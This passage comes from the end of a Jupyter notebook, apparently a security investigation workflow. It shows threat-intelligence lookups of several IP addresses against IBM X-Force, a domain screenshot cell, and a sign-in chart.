       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.18.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47</th>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.18.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>48</th>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.17.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50</th>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.17.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>51</th>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.17.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.17.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Ioc IocType   SafeIoc QuerySubtype Provider  Result Severity  \\\n",
       "42   5.1.8.1    ipv4   5.1.8.1         None   XForce    True  warning   \n",
       "44   5.1.8.1    ipv4   5.1.8.1         None   XForce    True  warning   \n",
       "45  2.18.0.2    ipv4  2.18.0.2         None   XForce    True  warning   \n",
       "46  2.18.0.2    ipv4  2.18.0.2         None   XForce    True  warning   \n",
       "47  2.18.0.2    ipv4  2.18.0.2         None   XForce    True  warning   \n",
       "48  2.17.0.2    ipv4  2.17.0.2         None   XForce    True  warning   \n",
       "50  2.17.0.2    ipv4  2.17.0.2         None   XForce    True  warning   \n",
       "51  2.17.0.2    ipv4  2.17.0.2         None   XForce    True  warning   \n",
       "\n",
       "                                                                                                Details  \\\n",
       "42  {'score': 1, 'cats': {'Dynamic IPs': 86}, 'categoryDescriptions': {'Dynamic IPs': 'This category...   \n",
       "44  {'score': 1, 'cats': {'Dynamic IPs': 86}, 'categoryDescriptions': {'Dynamic IPs': 'This category...   \n",
       "45  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "46  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "47  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "48  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "50  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "51  {'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...   \n",
       "\n",
       "                                                                                              RawResult  \\\n",
       "42  {'ip': '5.1.8.1', 'history': [{'created': '2012-04-26T06:30:00.000Z', 'reason': 'Regional Intern...   \n",
       "44  {'ip': '5.1.8.1', 'history': [{'created': '2012-04-26T06:30:00.000Z', 'reason': 'Regional Intern...   \n",
       "45  {'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "46  {'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "47  {'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "48  {'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "50  {'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "51  {'ip': '2.17.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...   \n",
       "\n",
       "                                       Reference  Status  \n",
       "42   https://api.xforce.ibmcloud.com/ipr/5.1.8.1       0  \n",
       "44   https://api.xforce.ibmcloud.com/ipr/5.1.8.1       0  \n",
       "45  https://api.xforce.ibmcloud.com/ipr/2.18.0.2       0  \n",
       "46  https://api.xforce.ibmcloud.com/ipr/2.18.0.2       0  \n",
       "47  https://api.xforce.ibmcloud.com/ipr/2.18.0.2       0  \n",
       "48  https://api.xforce.ibmcloud.com/ipr/2.17.0.2       0  \n",
       "50  https://api.xforce.ibmcloud.com/ipr/2.17.0.2       0  \n",
       "51  https://api.xforce.ibmcloud.com/ipr/2.17.0.2       0  "
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# TI Lookups\n",
    "ti_resp = ti.lookup_iocs(data=iocs, obs_col=\"Observable\")\n",
    "ti_resp[ti_resp['Severity']==\"warning\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Check out domain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Getting screenshot\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ffdcf282a9c14cd68b02032a2032c75a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntProgress(value=0, max=40)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "image_data = domain_utils.screenshot(\"microsoft.com\")\n",
    "from IPython.display import Image\n",
    "with open('screenshot.png', 'wb') as f:\n",
    "        f.write(image_data.content)\n",
    "\n",
    "display(Image(filename='screenshot.png'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 201,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SigninsChart\n"
     ]
    }
   ],
   "source": [
    "#Morph Charts\n",
    "morph = MorphCharts()\n",
    "# Create Morph Chart for some aspect of our data\n",
    "morph.display(data=query_data, chart_name=\"SigninsChart\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Lateral Movement Graph"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
